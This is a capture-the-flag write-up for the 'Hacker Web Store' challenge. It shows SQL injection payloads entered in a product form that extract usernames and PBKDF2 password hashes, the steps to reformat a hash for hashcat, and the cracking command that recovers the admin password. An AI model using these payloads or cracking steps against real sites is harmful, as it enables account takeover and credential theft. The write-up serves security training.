# Hacker Web Store
**Description:** Welcome to the hacker web store! Feel free to look around at our wonderful products, or create your own to sell.

## Solution

1. Going to the website, it is very simple, only 3 tabs. I see I can Create Product or Login. Immediately I go to create a product and enter ' to see if it fails, maybe sqli, and it does.

    ```SQL
    Products

    Error in Statement: INSERT INTO Products (name, price, desc) VALUES (''', '', '');

    unrecognized token: "''', '', '');"

    ```

2. I know its a sqli challenge now. I want to now get the users table and possibly login, however, I can only get a few names at time though (at least with my sqli skills).

    first i set the product name to this (in the create product form) to get the number of user accounts (it returns 3)

    ```SQL
    ','1',(SELECT COUNT(name) from users)); -- -
    ```

    sweet so i only have to run this 3 more times to get the username and password now. So I create 3 more products

    ```SQL
    ',(SELECT name from users where id =1),(SELECT password from users where id=1 )); -- -
    ```
    ```SQL
    ',(SELECT name from users where id =2),(SELECT password from users where id=2 )); -- -
    ```
    ```SQL
    ',(SELECT name from users where id =3),(SELECT password from users where id=3 )); -- -
    ```

    i didn't know the id field existed, but it did thankfully, so I did id 1, 2 and 3 and got these results

    ```
    Joram pbkdf2:sha256:600000$m28HtZYwJYMjkgJ5$2d481c9f3fe597590e4c4192f762288bf317e834030ae1e069059015fb336c34
    James pbkdf2:sha256:600000$GnEu1p62RUvMeuzN$262ba711033eb05835efc5a8de02f414e180b5ce0a426659d9b6f9f33bc5ec2
    website_admin_account pbkdf2:sha256:600000$MSok34zBufo9d1tc$b2adfafaeed459f903401ec1656f9da36f4b4c08a50427ec7841570513bf8e57
    ```

    now, I'm going to take a wild guess and assume that i need the `website_admin_account`

3. Now we can get our trusty buddy hashcat and use that with the password list attached with the challenge

    this uses sha256 so we need to get the hash-type, which is 

    ```
    10900 | PBKDF2-HMAC-SHA256  
    ```  

    1. we also need to fix up our hash so that we can use it for hashcat (thanks to this https://github.com/hashcat/hashcat/issues/1583)

        we must bas64 encode the salt and hash. it will look like this (I used CyberChef but don't forget to load hash as hex then base64)

        ```
        sha256:600000:TVNvazM0ekJ1Zm85ZDF0Yw==:sq36+u7UWfkDQB7BZW+do29LTAilBCfseEFXBRO/jlc=
        ```

    1. now we can run hashcat with our wordlist

    ```
    .\hashcat.exe -m 10900 "hash.txt" "password_list.txt"
    ```

    hashcat returns the password `ntadmin1234`

4. login on the website with website_admin_account:ntadmin1234 to get flag

![hackerman](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExNWNjN280cjduNmdnY2EzbjU4emttc2o3NDl4dGtxM2VqaTc3ajU1MyZlcD12MV9naWZzX3NlYXJjaCZjdD1n/3knKct3fGqxhK/giphy.gif)